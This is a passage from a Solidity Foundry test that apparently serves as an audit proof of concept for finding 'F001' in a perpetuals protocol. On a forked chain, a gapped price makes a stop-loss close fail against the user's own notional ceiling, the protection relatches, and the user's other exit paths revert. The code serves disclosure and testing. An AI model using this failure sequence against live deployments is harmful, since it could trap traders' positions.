        console.log("alice close-notional ceiling (USDG 1e6)", params.closeLimits.maxExecutionNotionalAssets);

        // Step 3: the basket gaps 1.5% above entry; any keeper triggers the stop and queues the zero-bounty child.
        _advance(t + 6, 24);
        vm.prank(keeper);
        uint64 childId = protection.triggerPositionProtection{value: pythFee}(protectionId, _payload(GAP_BPS, t + 6, t + 5));
        assertEq(
            uint256(protectionViews.getPositionProtection(protectionId).status),
            uint256(PositionProtectionTypes.PositionProtectionStatus.Triggered),
            "stop-loss triggered"
        );

        // Step 4: a keeper executes the child at the gapped tick; its notional exceeds alice's ceiling, the policy
        //         rejects it (ConstraintViolation) and the book relatches the protection.
        _advance(t + 8, 32);
        vm.prank(keeper);
        r = keeperRouter.executeOrder{value: 2 * pythFee}(childId, _payload(GAP_BPS, t + 7, t + 6));
        assertEq(uint256(r.status), uint256(OrderV3Types.LifecycleStatus.Failed), "child failed");
        assertEq(
            uint256(r.terminalReason),
            uint256(OrderV3Types.TerminalReason.ConstraintViolation),
            "child failed on alice's own notional ceiling"
        );
        assertEq(
            uint256(protectionViews.getPositionProtection(protectionId).status),
            uint256(PositionProtectionTypes.PositionProtectionStatus.Latched),
            "protection relatched"
        );
        assertEq(routerViews.pendingOrderCounts(alice), 0, "no live child");
    }

    /// @dev Honest remedy: alice amends while Latched, a keeper retries, the next child closes at the gap.
    function _amendAndCloseAtGap(uint64 protectionId) internal returns (uint256 loss) {
        vm.prank(alice);
        protection.amendLatchedPositionProtectionCloseLimits(protectionId, _unlimited());
        uint64 t = uint64(vm.getBlockTimestamp());
        vm.prank(keeper);
        uint64 childId = protection.retryPositionProtectionClose(protectionId);
        _advance(t + 2, 40);
        vm.prank(keeper);
        OrderV3Types.ExecutionResult memory r =
            keeperRouter.executeOrder{value: 2 * pythFee}(childId, _payload(GAP_BPS, t + 1, t));
        assertEq(uint256(r.status), uint256(OrderV3Types.LifecycleStatus.Executed), "amended stop-loss closed");
        loss = DEPOSIT - clearinghouse.balanceAssets(alice);
    }

    /// @dev alice's documented remedy, one call, as the SDK builds it. Counts attempts and reverts.
    function _aliceAmends(uint64 protectionId, uint256 attempts, uint256 reverts)
        internal
        returns (uint256, uint256)
    {
        vm.prank(alice);
        (bool ok, bytes memory ret) = PROTECTION_BOOK.call(
            abi.encodeCall(
                IPositionProtectionActions.amendLatchedPositionProtectionCloseLimits, (protectionId, _unlimited())
            )
        );
        ++attempts;
        if (!ok) {
            assertEq(
                bytes4(ret), IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector, "amend: ProtectionNotLatched"
            );
            ++reverts;
        }
        return (attempts, reverts);
    }

    function _assertOtherExitsShut(uint64 protectionId) internal {
        vm.startPrank(alice);
        (bool ok, bytes memory ret) =
            PROTECTION_BOOK.call(abi.encodeCall(IPositionProtectionActions.cancelPositionProtection, (protectionId)));
        assertFalse(ok, "cancel shut");
        assertEq(bytes4(ret), IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector, "cancel: ProtectionNotArmed");
        OrderV3Types.OrderRequest memory close = _closeRequest();
        (ok, ret) = PROTECTION_BOOK.call(
            abi.encodeCall(IPositionProtectionActions.cancelPositionProtectionAndCommitClose, (protectionId, close))
        );
        assertFalse(ok, "cancel-and-close shut");
        assertEq(
            bytes4(ret), IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector, "cancel-and-close: ProtectionNotArmed"
        );
        close.clientOrderId = keccak256("F001-plain-close");
        (ok, ret) = ROUTER.call(abi.encodeCall(IPerpsTraderActions.commitOrder, (close)));
        assertFalse(ok, "ordinary close shut");
        assertEq(bytes4(ret), IOrderRouterErrors.OrderRouter__ProtectionActive.selector, "commitOrder: ProtectionActive");
        vm.stopPrank();
    }

    // ------------------------------------------------------------------ helpers

    function _unlimited() internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory) {
        return PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    function _bounds() internal view returns (OrderV3Types.ExecutionBounds memory) {
        uint256 window = routerViews.maxExecutionWindowSeconds();
        return OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + window),
            executionWindowSeconds: uint32(window),
            allowedExecutionModes: 7,
            expectedConfigHash: lifecycle.currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _openRequest() internal view returns (OrderV3Types.OrderRequest memory) {
        return OrderV3Types.OrderRequest({
            clientOrderId: keccak256("F001-alice-open"),
            side: CfdTypes.Side.LONG,
            sizeDelta: SIZE,
            marginDelta: MARGIN,
            targetPrice: 1,
            isClose: false,
            bounds: _bounds()
        });
    }

    function _closeRequest() internal view returns (OrderV3Types.OrderRequest memory) {
        return OrderV3Types.OrderRequest({
            clientOrderId: keccak256("F001-cancel-and-close"),
            side: CfdTypes.Side.LONG,
            sizeDelta: SIZE,
            marginDelta: 0,
            targetPrice: type(uint256).max,
            isClose: true,
            bounds: _bounds()
        });
    }

    /// @dev Moves time and the L2 block. On an Arbitrum fork `block.number` is the L1 block, and forge serves the
    ///      ArbSys precompile (0x64, out of scope) as the fork's L2 block without following vm.roll. On chain
    ///      arbBlockNumber() advances every L2 block, so the PoC sets it to the rolled L2 height.
    function _advance(uint64 timestamp, uint256 l2Blocks) internal {
        l2Offset += l2Blocks;
        uint256 l2Block = FORK_BLOCK + l2Offset;
        vm.warp(timestamp);
        vm.roll(l2Block);
        vm.mockCall(
            address(100), abi.encodeWithSelector(IArbSysBlockF001.arbBlockNumber.selector), abi.encode(l2Block)
        );
    }

    /// @dev Signed-update stand-in: every feed ticks at `tick` (previous tick `prevTick`) at the REAL stored price of
    ///      FORK_BLOCK scaled so the basket moves by `bps` / 10,000 (inverse-quoted feeds scaled inversely).
    function _payload(uint256 bps, uint64 tick, uint64 prevTick) internal view returns (bytes[] memory data) {
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](6);
        for (uint256 i; i < 6; ++i) {
            PythStructs.Price memory p = storedAtFork[i];
            uint256 raw = uint256(uint64(p.price));
            uint256 conf = uint256(p.conf);
            if (inverted[i]) {
                raw = raw * 10_000 / bps;
                conf = conf * 10_000 / bps;
            } else {
                raw = raw * bps / 10_000;
                conf = conf * bps / 10_000;
            }
            updates[i] = MockPyth.FeedUpdate({
                id: feedIds[i],
                price: MockPyth.MockPrice({
                    price: int64(uint64(raw)), conf: uint64(conf), expo: p.expo, publishTime: tick, prevPublishTime: prevTick
                })
            });
        }
        data = new bytes[](1);
        data[0] = abi.encode(updates);
    }
}
```
